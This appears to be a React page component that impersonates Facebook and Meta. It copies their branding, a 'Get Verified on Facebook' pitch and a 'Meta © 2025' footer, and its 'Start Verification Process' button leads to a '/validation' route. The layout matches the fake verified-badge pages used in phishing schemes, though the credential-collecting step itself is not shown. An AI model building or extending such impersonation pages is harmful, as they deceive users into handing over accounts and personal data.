import { Button } from "@/components/ui/button";
import { Card, CardContent } from "@/components/ui/card";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { Search } from "lucide-react";

export default function Home() {
  const [, setLocation] = useLocation();

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Meta Tags for SEO */}
      <MetaTags 
        title="Meta Verified | Home"
        description="Request a verified badge on Facebook - Get Started"
      />

      {/* Navigation Bar */}
      <nav className="flex items-center justify-between p-3 sm:p-4 border-b">
        <div className="flex items-center">
          <p className="text-[#1877f2] text-xl sm:text-2xl font-bold">facebook</p>
        </div>
        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 sm:px-4 py-1.5 sm:py-2">
          <Search className="w-3 h-3 sm:w-4 sm:h-4 mr-2 text-[#65676B]" />
          <input
            type="text"
            placeholder="Search"
            className="bg-transparent outline-none text-sm sm:text-base w-24 sm:w-auto text-[#65676B] placeholder-[#65676B]"
          />
        </div>
      </nav>

      {/* Main Content */}
      <div className="flex-1 flex justify-center items-center p-4 sm:p-8">
        <Card className="max-w-2xl w-full">
          <CardContent className="p-6 space-y-6">
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-900 text-center">
              Get Verified on Facebook
            </h1>

            <div className="space-y-4 text-gray-600">
              <p>
                The verified badge is a mark of authenticity that appears next to a Facebook Page or profile's name to show that Facebook has confirmed it is the genuine presence of the public figure, celebrity, or brand it represents.
              </p>
              
              <p>
                To be eligible for verification, your account must:
              </p>
              
              <ul className="list-disc pl-5 space-y-2">
                <li>Represent a real person, registered business, or entity</li>
                <li>Have a complete profile with an about section, profile picture, and at least one post</li>
                <li>Follow Facebook's Terms of Service and Community Standards</li>
              </ul>
            </div>

            <Button 
              onClick={() => setLocation("/validation")}
              className="w-full py-3 text-base bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold rounded-lg transition-colors duration-200"
            >
              Start Verification Process
            </Button>
          </CardContent>
        </Card>
      </div>

      {/* Footer */}
      <div className="text-center p-3 sm:p-4 text-xs sm:text-sm text-gray-500 border-t">
        Meta © 2025
      </div>
    </div>
  );
}
